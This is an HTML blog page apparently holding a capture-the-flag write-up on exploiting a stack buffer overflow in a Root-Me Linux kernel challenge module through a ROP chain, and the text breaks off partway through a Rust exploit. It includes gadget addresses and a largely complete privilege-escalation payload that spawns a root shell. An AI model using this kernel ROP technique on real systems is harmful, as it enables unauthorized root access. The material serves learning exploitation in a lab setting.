@@ -1,0 +1,509 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  
+    <title>Pwn: Linux Kernel x86 - Exploiting a Buffer Overflow with ROP :: yocvito website</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="A simple linux kernel stack overflow challenge to train basic kernel ROP exploits" />
+<meta name="keywords" content="write-up, pwn, linux-kernel, x86" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="//localhost:1313/posts/pwn-linkern-rop/" />
+
+
+
+
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/style.min.1cdbb7cf76923868c5b397f2052baabd091aedcc09ffebdd5da68e6d56712689.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/buttons.min.2bc533403a27dfe0e93105a92502b42ce4587e2e4a87d9f7d349e51e16e09478.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/code.min.00125962708925857e7b66dbc58391d55be1191a3d0ce2034de8c9cd2c481c36.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/fonts.min.4881f0c525f3ce2a1864fb6e96676396cebe1e6fcef1933e8e1dde7041004fb5.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/footer.min.2e3eb191baee58dd05a9f0104ac1fab0827bca7c64dafe0b2579f934c33a1d69.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/header.min.b6fb4423cf82a9f9d7abc9cd010223fa3d70a6526a3f28f8e17d814c06e18f9e.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/main.min.fe8dc560fccb53a458b0db19ccb7b265764ac46b68596b7e099c6793054dd457.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/menu.min.83637a90d903026bc280d3f82f96ceb06c5fc72b7c1a8d686afb5bbf818a29f7.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/pagination.min.82f6400eae7c7c6dc3c866733c2ec0579e4089608fea69400ff85b3880aa0d3c.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/post.min.fc74ca360273c1d828da3c02b8174eba435607b369d98418ccc6f2243cd4e75d.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/prism.min.9023bbc24533d09e97a51a0a42a5a7bfe4c591ae167c5551fb1d2191d11977c0.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/syntax.min.cc789ed9377260d7949ea4c18781fc58959a89287210fe4edbff44ebfc1511b6.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/terminal.min.dc41063add420c2d2107bf5328b2f5abe23fb57e24dbc4fa9e7827b9f5bd8f9a.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css">
+
+
+
+
+
+
+
+<link rel="shortcut icon" href="//localhost:1313/favicon.png">
+<link rel="apple-touch-icon" href="//localhost:1313/apple-touch-icon.png">
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="yocvito" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Pwn: Linux Kernel x86 - Exploiting a Buffer Overflow with ROP">
+<meta property="og:description" content="A simple linux kernel stack overflow challenge to train basic kernel ROP exploits" />
+<meta property="og:url" content="//localhost:1313/posts/pwn-linkern-rop/" />
+<meta property="og:site_name" content="yocvito website" />
+
+  
+  
+  <meta property="og:image" content="//localhost:1313/">
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2025-03-04 11:31:21 &#43;0100 CET" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body>
+
+
+<div class="container">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    yocvito
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/about/about">About</a></li>
+        
+      
+        
+          <li><a href="/posts">Blog</a></li>
+        
+      
+        
+          <li><a href="/projects">Projects</a></li>
+        
+      
+        
+          <li><a href="/about/resume">Resume / CV</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/about/about" >About</a></li>
+        
+      
+        
+          <li><a href="/posts" >Blog</a></li>
+        
+      
+        
+          <li><a href="/projects" >Projects</a></li>
+        
+      
+        
+          <li><a href="/about/resume" >Resume / CV</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="//localhost:1313/posts/pwn-linkern-rop/">Pwn: Linux Kernel x86 - Exploiting a Buffer Overflow with ROP</a>
+  </h1>
+  <div class="post-meta"><time class="post-date">2025-03-04</time><span class="post-author">yocvito</span></div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="//localhost:1313/tags/write-up/">write-up</a>&nbsp;
+      
+      #<a href="//localhost:1313/tags/pwn/">pwn</a>&nbsp;
+      
+      #<a href="//localhost:1313/tags/linux-kernel/">linux-kernel</a>&nbsp;
+      
+      #<a href="//localhost:1313/tags/x86/">x86</a>&nbsp;
+      
+    </span>
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <h1 id="pwn-linkern-x86---basic-rop">PWN: LinKern x86 - Basic ROP<a href="#pwn-linkern-x86---basic-rop" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<p>We are tasked with exploiting an LKM that does nothing interesting except exposing a buffer overflow vulnerability when writing to the character device at <code>/dev/bof</code> <em>(this is showed in the challenge <code>README</code> file)</em></p>
+<h2 id="setting-up-debugging-environment">Setting up debugging environment<a href="#setting-up-debugging-environment" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>First of all, we need to setup a debugging environment so we can try and test on our system directly.</p>
+<p>For this challenge, we can download the following files for testing locally:</p>
+<ul>
+<li><code>bzImage</code>: the image of the kernel</li>
+<li><code>initramfs.img</code>: the filesystem (containing the buggy LKM)</li>
+<li><code>._start_vm</code>: <strong>QEMU</strong> initialization script</li>
+</ul>
+<p>Actually, the system doesn&rsquo;t restricts reading from <code>/proc/kallsyms</code> which means we can already uncover kernel functions addresses without relying on a <strong>leak</strong> + offset calculation. Moreover, <strong>KASLR</strong> isn&rsquo;t enable which allows us to get the same kernel addresses over reboot. All of this makes kernel image (<code>bzImage</code>) not being necessarily usefull there for reversing.</p>
+<p>What we are more interested in is getting the buggy LKM to analyze it. We can simply decompress the <em>initramfs</em> and get it from there:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ file initramfs.img 
+</span></span><span style="display:flex;"><span>initramfs.img: gzip compressed data, was <span style="color:#e6db74">&#34;initramfs&#34;</span>, last modified: Mon Mar  <span style="color:#ae81ff">3</span> 13:57:13 2025, from Unix, original size modulo 2^32 <span style="color:#ae81ff">1966592</span>
+</span></span><span style="display:flex;"><span>$ mv initramfs.img initramfs.gz <span style="color:#f92672">&amp;&amp;</span> gunzip initramfs.gz
+</span></span><span style="display:flex;"><span>$ mkdir fs
+</span></span><span style="display:flex;"><span>$ cpio -ivD fs/ &lt; initramfs
+</span></span><span style="display:flex;"><span>$ ls fs/
+</span></span><span style="display:flex;"><span>bin  dev  etc  home  init  lib  lib64  linuxrc  mnt  proc  root  sbin  sys  usr
+</span></span><span style="display:flex;"><span>$ find fs/ -iname <span style="color:#e6db74">&#34;*.ko&#34;</span>
+</span></span><span style="display:flex;"><span>fs/lib/modules/4.10.3/rootme/ch39.ko
+</span></span></code></pre></div><p>Now that we have all the files we want to analyze, we need to actually setup the runtime environment where we will test our exploit. As the challenge already provides a script to emulate the kernel using <strong>qemu</strong>, we will simply use this one, which we modify as the following (we just change paths, user and remove passwd file):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash -p
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>PATH<span style="color:#f92672">=</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+</span></span><span style="display:flex;"><span>CHALLPATH<span style="color:#f92672">=</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>STTY<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>stty -g<span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>stty intr ^-
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>TEMP<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>mktemp -d -p /var/tmp/<span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>chgrp <span style="color:#e6db74">${</span>USER<span style="color:#e6db74">}</span> <span style="color:#e6db74">${</span>TEMP<span style="color:#e6db74">}</span>
+</span></span><span style="display:flex;"><span>chmod <span style="color:#ae81ff">770</span> <span style="color:#e6db74">${</span>TEMP<span style="color:#e6db74">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;A share will be available: host:</span><span style="color:#e6db74">${</span>TEMP<span style="color:#e6db74">}</span><span style="color:#e6db74"> -&gt; guest:/mnt/share&#34;</span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;Launching the vulnerable machine...&#34;</span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>qemu-system-x86_64 <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    -no-reboot <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    -m 32M <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    -cpu kvm64,+smep,check <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    -nographic <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    -kernel $CHALLPATH/bzImage <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    -append <span style="color:#e6db74">&#39;console=ttyS0 loglevel=3 oops=panic panic=1&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    -monitor /dev/null <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    -initrd $CHALLPATH/initramfs.img <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    -snapshot <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    -fsdev local,id<span style="color:#f92672">=</span>exp1,path<span style="color:#f92672">=</span><span style="color:#e6db74">${</span>TEMP<span style="color:#e6db74">}</span>,security_model<span style="color:#f92672">=</span>mapped -device virtio-9p-pci,fsdev<span style="color:#f92672">=</span>exp1,mount_tag<span style="color:#f92672">=</span>rootme
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>rm -rf <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>TEMP<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span> 2&gt; /dev/null
+</span></span><span style="display:flex;"><span>stty <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>STTY<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+</span></span></code></pre></div><p>We can now start our testing environment (run <code>./start_vm.sh</code>):</p>
+<p><img alt="Crashing the test env" src="/img/pwn-linkern-rop/test-env.png"></p>
+<h2 id="analyzing-the-lkm">Analyzing the LKM<a href="#analyzing-the-lkm" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>Let&rsquo;s start analyzing the LKM to understand where the vuln resides. We open the <code>ch39.ko</code> file in IDA.</p>
+<p>The <code>init_module</code> function (entry point of an LKM) is quite simple, it registers a character device at <code>/dev/bof</code> with a <code>struct file_operations</code> structure containing the <code>bof_&lt;read|write|open|close&gt;</code> function pointers.</p>
+<p><img alt="LKM init" src="/img/pwn-linkern-rop/lkm-init.png"></p>
+<p>As we know the overflow is triggered by writing to the char device, the vulnerability has to be in <code>bof_write</code>. Let&rsquo;s analyze it (the comments are generated by <a href="https://github.com/ZjW1nd/Better-printk-IDA9">Better-printk</a> plugin).</p>
+<p><img alt="<code>bof_write</code> analysis" src="/img/pwn-linkern-rop/bof-write.png"></p>
+<p>We clearly see that if <code>a1</code> is the size of the input and <code>a2</code> our input, there is a buffer overflow on the <code>sbuf</code> stack buffer variable because there is no check to ensure <code>a1</code> doesn&rsquo;t go beyong <code>sizeof(sbuf)</code>.</p>
+<p>By statically analyzing the function prelude, we can guess the offset from <code>sbuf</code> start to the return address could be 40 bytes but let&rsquo;s confirm it dynamically.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ cyclic <span style="color:#ae81ff">100</span>
+</span></span><span style="display:flex;"><span>aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
+</span></span></code></pre></div><p><img alt="return address offset finding" src="/img/pwn-linkern-rop/return-address.png"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ cyclic -l 0x6161616b
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">40</span>
+</span></span></code></pre></div><p>We can confirm that we are able to control the return address of the function, allowing us to divert the control flow to do nasty things (for example escalating privileges to root).</p>
+<h2 id="exploiting-the-vulnerability">Exploiting the vulnerability<a href="#exploiting-the-vulnerability" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>So now that we can divert control flow, what do we want to do? Well, as stated before escalating our privileges to root would be interesting. In the linux kernel, changing a process credentials to root is as simple as calling <code>commit_creds(prepare_kernel_cred(NULL))</code>.
+This is because until linux kernel release 6.2.0, the kernel uses the <code>init</code> task (pid=1) credentials if no arguments (<code>NULL</code>) is provided to <code>prepare_kernel_cred</code> and as init will likely be run as root, this effectively sets the current process creds to root.</p>
+<p>In order to build our ROPchain, we need to understand how the <code>prepare_kernel_cred</code> and <code>commit_creds</code> functions takes their argument. Both functions uses a particular calling convention similar to <strong>fastcall</strong> (<a href="https://hex-rays.com/blog/igors-tip-of-the-week-51-custom-calling-conventions">IDA label it as <code>__usercall</code></a>), where arguments are passed using registers. Functions takes their first argument from <code>eax</code> while the return value is also hold in <code>eax</code>.</p>
+<p><img alt="prepare_kernel_cred" src="/img/pwn-linkern-rop/prepare-creds.png"></p>
+<p>This means for a successfull ROPchain, we need to:</p>
+<ul>
+<li>set <code>eax</code> to 0 (NULL)
+<ul>
+<li><em>there is a relevant gadget for this in the kernel image at address <code>0xc1371479</code> which pop stack value into eax and other registers (I did not search a lot but it might be possible to find a gadget popping less values)</em></li>
+</ul>
+</li>
+<li>call <code>prepare_kernel_cred</code></li>
+<li>call <code>commit_creds</code> (argument is the return value of <code>prepare_kernel_cred</code>, nothing to setup)</li>
+<li>return to userspace (where we spawn a shell with the new credentials)</li>
+</ul>
+<p>Returning to userspace can be done by calling the <code>iret</code> instructions, which retrieves the necessary information for returning to userspace from the stack. The structure containing these informations has the following layout:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> trap_frame {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint32_t</span> eip; <span style="color:#75715e">// where we return
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">uint32_t</span> cs;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint32_t</span> eflags;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint32_t</span> esp;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint32_t</span> ss;
+</span></span><span style="display:flex;"><span>};
+</span></span></code></pre></div><p>So what we need to do for a successfull return to userspace is pointing the <code>eip</code> of the <code>trap_frame</code> structure to the address of a function of our program that will spawn <code>/bin/sh</code>. As our ROPchain changes the current process credentials to root, this effectively spawn a root shell for us. We also need to take care all the other fields are valid.</p>
+<p>A relevant gadget for the <code>iret</code> instruction is at address <code>0xC101F504</code> in the kernel image. I essentially found these gadgets using either <code>ROPgadget</code> or the built-in IDA search feature. The addresses in the binary are the same as in memory because there is no kASLR. So we could still look at kallsyms and calculate offsets to the gadget from that, but it&rsquo;s not necessary there.</p>
+<p>Finally, this allows us to build the following exploit script in Rust:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Rust" data-lang="Rust"><span style="display:flex;"><span><span style="color:#66d9ef">use</span> std::{arch::asm, fs::OpenOptions, io::Write};
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">use</span> libc::geteuid;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#[repr(C, packed)]</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#[derive(Copy, Clone)]</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">TrapFrame</span> {
+</span></span><span style="display:flex;"><span>    eip: <span style="color:#66d9ef">u32</span>,
+</span></span><span style="display:flex;"><span>    cs: <span style="color:#66d9ef">u32</span>,
+</span></span><span style="display:flex;"><span>    eflags: <span style="color:#66d9ef">u32</span>,
+</span></span><span style="display:flex;"><span>    esp: <span style="color:#66d9ef">u32</span>,
+</span></span><span style="display:flex;"><span>    ss: <span style="color:#66d9ef">u32</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">impl</span> TrapFrame {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">pub</span> <span style="color:#66d9ef">fn</span> <span style="color:#a6e22e">to_bytes</span>(self) -&gt; [<span style="color:#66d9ef">u8</span>; <span style="color:#ae81ff">20</span>] {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">unsafe</span> { std::mem::transmute(self) }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#[unsafe(no_mangle)]</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">extern</span> <span style="color:#e6db74">&#34;C&#34;</span> <span style="color:#66d9ef">fn</span> <span style="color:#a6e22e">spawn_shell</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#66d9ef">unsafe</span> { geteuid() } <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span> {
+</span></span><span style="display:flex;"><span>        println!(<span style="color:#e6db74">&#34;Seems like I get call but we&#39;re not root yet, very sad... :(&#34;</span>);
+</span></span><span style="display:flex;"><span>        std::process::exit(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    println!(<span style="color:#e6db74">&#34;Got root !!! Spawning shell...&#34;</span>);
+</span></span><span style="display:flex;"><span>    std::process::Command::new(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>)
+</span></span><span style="display:flex;"><span>        .spawn().unwrap()
+</span></span><span style="display:flex;"><span>        .wait().unwrap();
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">fn</span> <span style="color:#a6e22e">get_cs</span>() -&gt; <span style="color:#66d9ef">u32</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#66d9ef">mut</span> cs: <span style="color:#66d9ef">u32</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsafe</span> {
+</span></span><span style="display:flex;"><span>        asm!(<span style="color:#e6db74">&#34;push cs&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;pop {cs:e}&#34;</span>,
+</span></span><span style="display:flex;"><span>            cs <span style="color:#f92672">=</span> out(reg) cs);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    cs
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">fn</span> <span style="color:#a6e22e">get_eflags</span>() -&gt; <span style="color:#66d9ef">u32</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#66d9ef">mut</span> eflags: <span style="color:#66d9ef">u32</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsafe</span> {
+</span></span><span style="display:flex;"><span>        asm!(<span style="color:#e6db74">&#34;pushf&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;pop {eflags:e}&#34;</span>,
+</span></span><span style="display:flex;"><span>            eflags <span style="color:#f92672">=</span> out(reg) eflags);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    eflags
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">fn</span> <span style="color:#a6e22e">get_esp</span>() -&gt; <span style="color:#66d9ef">u32</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#66d9ef">mut</span> esp: <span style="color:#66d9ef">u32</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsafe</span> {
+</span></span><span style="display:flex;"><span>        asm!(<span style="color:#e6db74">&#34;push esp&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;pop {esp:e}&#34;</span>,
+</span></span><span style="display:flex;"><span>            esp <span style="color:#f92672">=</span> out(reg) esp);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    esp
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">fn</span> <span style="color:#a6e22e">get_ss</span>() -&gt; <span style="color:#66d9ef">u32</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#66d9ef">mut</span> ss: <span style="color:#66d9ef">u32</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsafe</span> {
+</span></span><span style="display:flex;"><span>        asm!(<span style="color:#e6db74">&#34;push ss&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;pop {ss:e}&#34;</span>,
+</span></span><span style="display:flex;"><span>            ss <span style="color:#f92672">=</span> out(reg) ss);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    ss
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">fn</span> <span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#66d9ef">mut</span> f <span style="color:#f92672">=</span> <span style="color:#66d9ef">match</span> OpenOptions::new()
+</span></span><span style="display:flex;"><span>        .read(<span style="color:#66d9ef">true</span>)
+</span></span><span style="display:flex;"><span>        .write(<span style="color:#66d9ef">true</span>)
+</span></span><span style="display:flex;"><span>        .open(<span style="color:#e6db74">&#34;/dev/bof&#34;</span>) {
+</span></span><span style="display:flex;"><span>            Ok(file) <span style="color:#f92672">=&gt;</span> file,
+</span></span><span style="display:flex;"><span>            Err(err) <span style="color:#f92672">=&gt;</span> panic!(<span style="color:#e6db74">&#34;Error: </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span>, err),
+</span></span><span style="display:flex;"><span>        };
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> commit_creds_ea: <span style="color:#66d9ef">u32</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xc1070e80</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> prepare_kernel_cred_ea: <span style="color:#66d9ef">u32</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xc10711f0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> g_pop_eax_ea: <span style="color:#66d9ef">u32</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xc1371479</span>; <span style="color:#75715e">// pop eax,edx,ebx,esi,edi,ebp
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">let</span> g_iret_ea: <span style="color:#66d9ef">u32</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xC101F504</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#66d9ef">mut</span> payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span>.repeat(<span style="color:#ae81ff">40</span>);
+</span></span><span style="display:flex;"><span>    payload.extend_from_slice(g_pop_eax_ea.to_le_bytes().as_ref());
+</span></span><span style="display:flex;"><span>    payload.extend_from_slice(<span style="color:#ae81ff">0_</span><span style="color:#66d9ef">u32</span>.to_le_bytes().as_ref());
+</span></span><span style="display:flex;"><span>    payload.extend_from_slice(<span style="color:#ae81ff">0_</span><span style="color:#66d9ef">u32</span>.to_le_bytes().as_ref());
+</span></span><span style="display:flex;"><span>    payload.extend_from_slice(<span style="color:#ae81ff">0_</span><span style="color:#66d9ef">u32</span>.to_le_bytes().as_ref());
+</span></span><span style="display:flex;"><span>    payload.extend_from_slice(<span style="color:#ae81ff">0_</span><span style="color:#66d9ef">u32</span>.to_le_bytes().as_ref());
+</span></span><span style="display:flex;"><span>    payload.extend_from_slice(<span style="color:#ae81ff">0_</span><span style="color:#66d9ef">u32</span>.to_le_bytes().as_ref());
+</span></span><span style="display:flex;"><span>    payload.extend_from_slice(<span style="color:#ae81ff">0_</span><span style="color:#66d9ef">u32</span>.to_le_bytes().as_ref());
+</span></span><span style="display:flex;"><span>    payload.extend_from_slice(prepare_kernel_cred_ea.to_le_bytes().as_ref());
+</span></span><span style="display:flex;"><span>    payload.extend_from_slice(commit_creds_ea.to_le_bytes().as_ref());
+</span></span><span style="display:flex;"><span>    payload.extend_from_slice(g_iret_ea.to_le_bytes().as_ref());
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> tf <span style="color:#f92672">=</span> TrapFrame {
+</span></span><span style="display:flex;"><span>        eip: <span style="color:#a6e22e">spawn_shell</span> <span style="color:#66d9ef">as</span> <span style="color:#f92672">*</span><span style="color:#66d9ef">const</span> () <span style="color:#66d9ef">as</span> <span style="color:#66d9ef">u32</span>,
+</span></span><span style="display:flex;"><span>        cs: <span style="color:#a6e22e">get_cs</span>(),
+</span></span><span style="display:flex;"><span>        eflags: <span style="color:#a6e22e">get_eflags</span>(),
+</span></span><span style="display:flex;"><span>        esp: <span style="color:#a6e22e">get_esp</span>(),
+</span></span><span style="display:flex;"><span>        ss:<span style="color:#a6e22e">get_ss</span>() 
+</span></span><span style="display:flex;"><span>    };
+</span></span><span style="display:flex;"><span>    payload.extend_from_slice(tf.to_bytes().as_ref());
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    println!(<span style="color:#e6db74">&#34;@spawn_shell = </span><span style="color:#e6db74">{:p}</span><span style="color:#e6db74">&#34;</span>, spawn_shell <span style="color:#66d9ef">as</span> <span style="color:#f92672">*</span><span style="color:#66d9ef">const</span> ());
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    println!(<span style="color:#e6db74">&#34;ROP chain:&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> chunk <span style="color:#66d9ef">in</span> payload.chunks(<span style="color:#ae81ff">4</span>) {
